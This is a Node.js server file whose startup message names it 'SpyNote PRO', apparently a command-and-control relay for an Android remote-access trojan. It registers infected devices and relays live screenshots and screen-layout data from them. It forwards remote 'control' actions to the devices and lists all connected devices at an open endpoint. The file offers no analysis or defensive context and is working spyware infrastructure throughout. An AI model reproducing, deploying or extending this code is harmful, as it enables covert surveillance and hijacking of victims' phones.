const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    maxHttpBufferSize: 100e6
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, connected: true, 
                socketId: socket.id, lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            console.log('📱 Device + Layout:', deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 ROUTE SCREEN + LAYOUT
    socket.on('screenshot-frame', (data) => {
        if (devices.has(data.deviceId)) {
            devices.get(data.deviceId).lastSeen = Date.now();
            socket.to(`device_${data.deviceId}`).emit('screenshot-frame', data);
        }
    });

    socket.on('layout-data', (data) => {
        if (devices.has(data.deviceId)) {
            socket.to(`device_${data.deviceId}`).emit('layout-data', data);
        }
    });

    // 🔥 INSTANT CONTROL
    socket.on('control', (controlData) => {
        const { deviceId, action } = controlData;
        if (devices.has(deviceId)) {
            socket.to(`device_${deviceId}`).emit('control', controlData);
            console.log(`🎮 ${action} → ${deviceId.slice(0,8)}`);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

// Cleanup
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 30000)) {
            devices.set(deviceId, { ...info, connected: false });
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote PRO + LAYOUT on port ${PORT}`);
});
